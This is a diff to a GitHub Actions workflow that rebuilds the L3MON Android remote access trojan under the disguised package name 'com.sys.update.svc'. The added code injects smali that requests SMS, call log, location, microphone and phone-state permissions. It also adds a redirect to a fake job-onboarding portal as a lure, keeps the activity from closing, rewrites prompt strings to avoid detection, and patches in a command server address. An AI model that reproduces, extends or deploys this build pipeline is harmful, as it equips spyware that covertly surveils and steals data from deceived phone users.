@@ -26,7 +26,6 @@ jobs:
 
       - name: Signature Obfuscation & Patching
         run: |
-          # Define package names
           OLD_PKG="com.etechd.l3mon"
           NEW_PKG="com.sys.update.svc"
           OLD_PATH="com/etechd/l3mon"
@@ -34,32 +33,36 @@ jobs:
 
           echo "Renaming package from $OLD_PKG to $NEW_PKG..."
           
-          # Escape dots for literal regex matching
           OLD_PKG_ESC=$(echo "$OLD_PKG" | sed 's/\./\\./g')
-          
-          # 1. Replace DOT notation (Mainly for Manifest, XML, and some string constants in Smali)
-          # We use -type f to catch all files including yml and xml
           find payload_source -type f -exec sed -i "s|$OLD_PKG_ESC|$NEW_PKG|g" {} +
-          
-          # 2. Replace SLASH notation (For Smali descriptors and paths)
           find payload_source -type f -exec sed -i "s|$OLD_PATH|$NEW_PATH|g" {} +
 
-          # 3. Physically move Smali files to new directory structure
           mkdir -p "payload_source/smali/$NEW_PATH"
           if [ -d "payload_source/smali/$OLD_PATH" ]; then
             mv payload_source/smali/$OLD_PATH/* "payload_source/smali/$NEW_PATH/"
             rm -rf "payload_source/smali/com/etechd"
           fi
 
-          # 4. Obfuscate Social Engineering Strings
-          # Using different strings to avoid detection
+          # Runtime Permission Injection (Android 14 Requirement)
+          # We inject the requestPermissions call into onCreate
+          PERMISSION_CODE='    const/4 v0, 0x7\n    new-array v0, v0, [Ljava/lang/String;\n    const/4 v1, 0x0\n    const-string v2, "android.permission.READ_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    const-string v2, "android.permission.RECEIVE_SMS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x2\n    const-string v2, "android.permission.READ_CALL_LOG"\n    aput-object v2, v0, v1\n    const/4 v1, 0x3\n    const-string v2, "android.permission.ACCESS_FINE_LOCATION"\n    aput-object v2, v0, v1\n    const/4 v1, 0x4\n    const-string v2, "android.permission.RECORD_AUDIO"\n    aput-object v2, v0, v1\n    const/4 v1, 0x5\n    const-string v2, "android.permission.POST_NOTIFICATIONS"\n    aput-object v2, v0, v1\n    const/4 v1, 0x6\n    const-string v2, "android.permission.READ_PHONE_STATE"\n    aput-object v2, v0, v1\n    const/4 v1, 0x1\n    invoke-virtual {p0, v0, v1}, L'"$NEW_PATH"'/MainActivity;->requestPermissions([Ljava/lang/String;I)V\n'
+          
+          sed -i "/invoke-virtual {p0, v0}, L$NEW_PATH\/MainActivity;->setContentView(I)V/a $PERMISSION_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+
+          # Redirect to Vercel Portal on Launch (Lure)
+          REDIRECT_CODE='    new-instance v0, Landroid/content/Intent;\n    const-string v1, "android.intent.action.VIEW"\n    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)\n    const-string v1, "https://global-talent-onboarding-portal.vercel.app/"\n    invoke-static {v1}, Landroid/net/Uri;->parse(Ljava/lang/String;)Landroid/net/Uri;\n    move-result-object v1\n    invoke-virtual {v0, v1}, Landroid/content/Intent;->setData(Landroid/net/Uri;)Landroid/content/Intent;\n    invoke-virtual {p0, v0}, L'"$NEW_PATH"'/MainActivity;->startActivity(Landroid/content/Intent;)V\n'
+          
+          sed -i "/invoke-virtual {p0, v0, v1}, L$NEW_PATH\/MainActivity;->requestPermissions/a $REDIRECT_CODE" "payload_source/smali/$NEW_PATH/MainActivity.smali"
+
+          # Prevent Activity from finishing immediately
+          sed -i 's/invoke-virtual {p0}, L'"$NEW_PATH"'\/MainActivity;->finish()V/# finish disabled/g' "payload_source/smali/$NEW_PATH/MainActivity.smali"
+
+          # Obfuscate Strings
           find payload_source -name "MainActivity.smali" -exec sed -i "s|Click 'Permissions'|Required Component Update|g" {} +
           find payload_source -name "MainActivity.smali" -exec sed -i "s|Enable ALL permissions|Grant system stability rights|g" {} +
-          find payload_source -name "MainActivity.smali" -exec sed -i "s|Enable 'Package Manager'|Sync complete|g" {} +
 
-          # 5. Dynamic IP/Port Patching
+          # Dynamic IP/Port Patching
           chmod +x patch_payload.sh
-          # Update patch script to use new path
           sed -i "s|payload_source/smali/com/etechd/l3mon/|payload_source/smali/$NEW_PATH/|g" patch_payload.sh
           ./patch_payload.sh
 
